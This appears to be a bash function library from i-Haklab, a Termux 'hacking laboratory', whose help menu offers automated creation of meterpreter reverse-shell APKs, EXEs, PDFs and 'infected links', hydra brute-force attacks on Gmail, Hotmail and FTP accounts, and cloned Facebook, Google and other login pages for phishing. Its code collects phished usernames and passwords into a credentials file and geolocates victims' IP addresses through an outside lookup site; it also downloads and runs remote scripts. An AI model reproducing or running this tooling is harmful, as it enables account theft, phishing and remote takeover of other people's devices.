#!/bin/bash
# This file contain all i-Haklab functions

if [ -d /data/data/com.termux/files/home/i-Haklab ]; then
	iHAKLAB=/data/data/com.termux/files/home/i-Haklab
else
	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
fi

banner() {
	if [ ! -e $iHAKLAB/.set/libexec/banner/i-Haklab ]; then
		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/banner/i-Haklab -O $iHAKLAB/.set/libexec/banner/i-Haklab > /dev/null 2>&1
	fi
        bash $iHAKLAB/.set/libexec/banner/i-Haklab
        sleep 0.5
}
export -f banner

chk-iHaklab() {
	until [ -d $iHAKLAB ]; do
		printf "$R\n[W]:-> i-Haklab needed$W |$Y Do y ou wanna install it?$W\n"
        	while read -p "[yes/no]:-> " yesorno && [ -z $yesorno ]; do
                	continue
        	done
        	if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
                	git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
                	cd ~/i-Haklab;bash setup-lite
        	else
                	printf "$G\n[!]-> Have a nice hacking day!!\n\n"
                	exit
        	fi
	done
}
export -f chk-iHaklab

ctrl_c() {
	printf "$Y\n[!]$R Need a help? join to$B Telegram$R t.me/Ivam3_Bot$W\n"
}
export -f ctrl_c

chk-Cuser() {
	while [ ! $(id -u) -ne 0 ]; do
        	printf "$R\n[W]:-> You need to be a common user$W\n"
        	exit
	done
}
export -f chk-Cuser

chk-Ruser() {
	while [ ! $(id -u) -eq 0 ]; do
		printf "$R\n[W]:-> You need to be a root user$W\n"
		exit
	done
}
export -f chk-Ruser

k-boom() {
	if [ ! -e $iHAKLAB/.set/libexec/banner/k-boom ]; then
		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/banner/k-boom -O $iHAKLAB/.set/libexec/banner/k-boom > /dev/null 2>&1
	fi
	bash $iHAKLAB/.set/libexec/banner/k-boom
}
export -f k-boom

Menu() {
	printf "$Y\n[i]->$W i-Haklab v.2.0 (c) 2020 by Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n$Y\nSyntax:$W i-Haklab [-arg-] [-option-]\n
$Y Arguments$W  |$Y    Options$W     |$Y    Description$W
╰─help─────➤────────────────➤ Show this help menu
╰─list─────➤────────────────➤ List all available tools/frameworks
╰─show─────➤──tools/books───➤ Show details about specific tools/books
|   ╰───────────|─────|─────➤ availables to be downloaded
|   |           ╰─────|─────➤ ex : i-Haklab show bettercap
|   |                 ╰─────➤ ex : i-Haklab show books
|   ╰──────➤──tutorials/QG──➤ Show tutorials and Quick Guides availables
|   ╰──────➤─────games──────➤ Show games available for play
╰─install──➤───tool─name────➤ Install tools or frameworks
╰─remove───➤───tool─name────➤ Remove tools or frameworks
╰─weechat──➤────────────────➤ Connect with irc Ivam3byCinderella chat
╰─update───➤────────────────➤ Update i-Haklab
╰speedtest─➤────────────────➤ Run a speed test of your network
╰translate─➤text─2─translate➤ Command line traductor
╰─root─────➤────────────────➤ Simulates a super user environment
╰─restore──➤────────────────➤ Restore the main directory to fix some bugs
╰reinstall─➤────────────────➤ Reinstall i-Haklab to factory configurations
╰─version──➤────────────────➤ Show i-Haklab version installed
|          |       |        |
|          |       |        |
  $Y [--] Automatitation Arguments [--]$W
Arguments  |    Options     |    Description
╰─handler──➤──file.rc name──➤ Start handler on msfconsole with previous setting
╰───apk────➤──inlan/outlan──➤ Create a coded payload apk
|    |          ╰─────|─────➤ LPORT=4546 apk=inlan.apk
|    |                ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
|    ╰──────────────────────➤ Payload=android/meterpreter/reverse_tcp
╰─paylink──➤─pc/nexam/soa5──➤ Create an infected link with payload
|             ╰───|────|────➤ Targets: [0]generic [1]windows [2]macOS [3]linux
|                 |    |      ex: i-Haklab paylink pc 2
|                 ╰────|────➤ For targets [0]nexxus and [29]samsung
|                      |      ex: i-Haklab paylink nexam 29
|                      ╰────➤ For android5 operative system only
╰──paypdf──➤────────────────➤ Create a pdf file with a reverse payload
╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
|               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp
|                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
|                     ╰─────➤ LHOST=serveo.net file=outlan.exe
╰─shodan───➤────────────────➤ Search vulnerable servers using metasploit
╰─bfmail───➤──email─passwd──➤ Start a brute force attack
|    ╰──────────────────────➤ at email(hotmail/gmail) account
|    ╰─────➤─────gmail──────➤ ex: i-Haklab bfgmail victim@gmail.com passwords.txt
|    ╰─────➤──hotmail/live──➤ ex: i-Haklab bfgmail victim@live.com passwords.txt
╰──bfftp───➤─user─passwd─ip─➤ Start a brute force attack at ftp server
|    ╰──────────────────────➤ example: i-Haklab bfftp users.txt passwords.txt 0.0.0.0
╰forwarding➤────────────────➤ Start a SSH client to request TCP port forwarding
|    ╰──────────────────────➤ from server and proxy.
|    ╰─────➤──port_number───➤ Set a specific port number 
|                  ╰────────➤ (default 4546 or 80 for rooted device)
|    ╰─────➤───subdomain────➤ Set a specitic subdomain
|    ╰──────────────────────➤ ex: i-Haklab forwarding <myport> <my-subdomain>
╰─phishing─➤──site─redirect─➤ Clone a specific website for phishing tests
|    ╰──────────────────────➤ Available: facebook mfacebook github google
|    ╰──────────────────────➤ instagram netflix spotify twitter
|    ╰──────────────────────➤ ex: i-Haklab mfacebook facebook.com
|__________________________________________________________________________________________\n\n"
}
export -f Menu

chk-api() {
        command -v termux-open > /dev/null || { printf "$R[w]->$W termux-tools needed$R |$W please install it"; exit; }
}
export -f chk-api

chk-sudo() {
        command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
}
export -f chk-sudo

chk-msf() {
        command -v msfconsole > /dev/null || { printf "$R\n[W]->$W Metasploit needed$R |$W please install it"; exit; }
}
export -f chk-msf

chk-php() {
        command -v php > /dev/null || { printf "$R\n[W]->$W php not found$R |$W run apt install php"; exit; }
}
export -f chk-php

chk-ssh() {
        command -v ssh > /dev/null || { printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"; exit; }
}
export -f chk-ssh

chk-mega() {
        command -v megadl > /dev/null || { printf "$R\n[W]->$W megatools not found$R |$W run apt install megatools"; exit; }
}
export -f chk-mega

chk-hydra() {
        command -v hydra > /dev/null || { printf "$R\n[W]->$W hydra not found$R |$W run apt install hydra"; exit; }
}
export -f chk-hydra

phishing-CredsResults() {
	ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
	if [ ! -z $ACCOUNT ]; then
		printf "$G\n[+]-> ACCOUNT:$W$ACCOUNT"
		echo $ACCOUNT >> $TMP_PATH/creds.txt
		sleep 0.5
	fi
	PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
	if [ ! -z $PASSWD ]; then
		printf "$G\n[+]-> PASSWORD:$W$PASSWD"
		echo $PASSWD >> $TMP_PATH/creds.txt
		sleep 0.5
	fi
}
export -f phishing-CredsResults

phishing-IPresults() {
IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11: Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)

if [ ! -z $IP ]; then 
	printf "$G\n[+]-> IP:$W$IP"
	echo $IP >> $TMP_PATH/creds.txt
	sleep 0.5
fi

UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
if [ ! -z $UA ]; then
	printf "$G\n[+]-> User Agent$W$UA"
	echo $UA >> $TMP_PATH/creds.txt
	sleep 0.5
fi
IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z '$IP_SPEED' ]; then
	printf "$G\n[+]-> IP Address speed:$W$IP_SPEED"
	echo $IP_SPEED >> $TMP_PATH/creds.txt
	sleep 0.5
fi
IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z '$IP_CURRENCY' ]; then
	printf "$G\n[+]-> IP Currency:$W$IP_CURRENCY"
	echo $IP_CURRENCY >> $TMP_PATH/creds.txt
	sleep 0.5
fi
CONTINENT=$(grep -o "Continent.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "<" -f1)
if [ ! -z '$CONTINENT' ]; then
	printf "$G\n[+]-> Continent:$W$CONTINENT"
	echo $CONTINENT >> $TMP_PATH/creds.txt
	sleep 0.5
fi
COUNTRY=$(grep -o "Country:.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [ ! -z $COUNTRY ]; then
	printf "$G\n[+]-> Country:$W$COUNTRY"
	echo $COUNTRY >> $TMP_PATH/creds.txt
	sleep 0.5
fi
STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [ ! -z '$STATE' ]; then
	printf "$G\n[+]-> State:$W$STATE"
	echo $STATE >> $TMP_PATH/creds.txt
	sleep 0.5
fi
CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z $CITY ]; then
	printf "$G\n[+]-> City:$W$CITY"
	echo $CITY >> $TMP_PATH/creds.txt
	sleep 0.5
fi
ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z $ISP ]; then
	printf "$G\n[+]-> ISP:$W$IPS"
	echo $ISP >> $TMP_PATH/creds.txt
	sleep 0.5
fi
AS_NUM=$(grep -o "AS Number" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [ ! -z '$AS_NUM' ]; then
	printf  "$G\n[+]-> AS Number:$W$AS_NUM"
	echo $AS_NUM >> $TMP_PATH/creds.txt
	sleep 0.5 
fi
}
export -f phishing-IPresults
